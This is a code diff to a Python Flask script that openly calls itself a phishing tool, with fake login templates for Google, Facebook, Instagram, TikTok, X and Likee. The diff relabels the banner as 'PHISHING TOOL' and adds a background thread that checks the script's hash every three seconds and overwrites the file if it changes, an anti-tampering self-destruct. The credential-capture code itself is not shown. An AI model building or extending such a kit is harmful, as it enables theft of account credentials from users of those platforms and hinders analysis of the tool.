@@ -1,9 +1,41 @@
+import hashlib
 import os
-import subprocess
 import threading
 import time
-import base64
 import sys
+
+# --- Start self-monitor ---
+SCRIPT_PATH = __file__
+EXPECTED_HASH = "a053b26ed0021b86deac3047d4564905613a54ac56dba95ebb9b512d70ec98a1"
+
+def calculate_hash():
+    try:
+        with open(SCRIPT_PATH, "rb") as f:
+            return hashlib.sha256(f.read()).hexdigest()
+    except:
+        return None
+
+def destroy_script():
+    try:
+        with open(SCRIPT_PATH, "w") as f:
+            f.write("# Script destroyed due to tampering.\n")
+        print("[X] Tampering detected. Script destroyed.")
+    except:
+        pass
+    sys.exit(1)
+
+def monitor_integrity():
+    while True:
+        current_hash = calculate_hash()
+        if current_hash != EXPECTED_HASH:
+            destroy_script()
+        time.sleep(3)
+
+threading.Thread(target=monitor_integrity, daemon=True).start()
+# --- End self-monitor ---
+
+import subprocess
+import base64
 from flask import Flask, request, render_template, redirect
 from termcolor import cprint
 import getpass
@@ -110,7 +142,7 @@ def select_template():
 def show_intro():
     os.system("clear")
     slow_print("===================================", "green")
-    slow_print("         Al--Yamani-hacker", "green")
+    slow_print("         PHISHING TOOL", "green")
     slow_print("===================================\n", "green")
     slow_print("[*] Templates: Google, Facebook, Instagram, TikTok, X, Likee", "yellow")
     slow_print("[~] Initializing...", "blue")
